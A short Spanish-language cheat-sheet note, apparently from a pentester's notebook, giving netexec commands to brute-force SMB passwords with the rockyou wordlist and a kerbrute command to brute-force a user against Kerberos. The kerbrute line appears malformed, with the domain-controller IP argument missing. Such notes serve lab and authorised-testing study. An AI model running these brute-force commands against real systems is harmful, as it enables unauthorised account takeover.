- Tags : #fuerza_bruta #kerberos #window #window_explotacion 

Fuerza bruta con netexec
```bash
netexec smb ip_victima -u user -p /dir_pass_list /dir_list_pass/rockyou.txt

#Cuando da el error de que solo tenga caracteres UTF-8 debemos ejecutarlo con ciertos parametros

netexec smb ip_victima -u user -p /dir_pass_list /dir_list_pass/rockyou.txt --ignore-pw-dcoding

```

Con kerbrute , aquí se hace la fuerza bruta contra el protocolo de Kerberos no contra smb

```bash
./kerbrute_linux_amd64 bruteuser -d dominio --dcip /wordlist/rockyou.txt user 
```

![](../../../attachments/Pasted%20image%2020260213174431.png)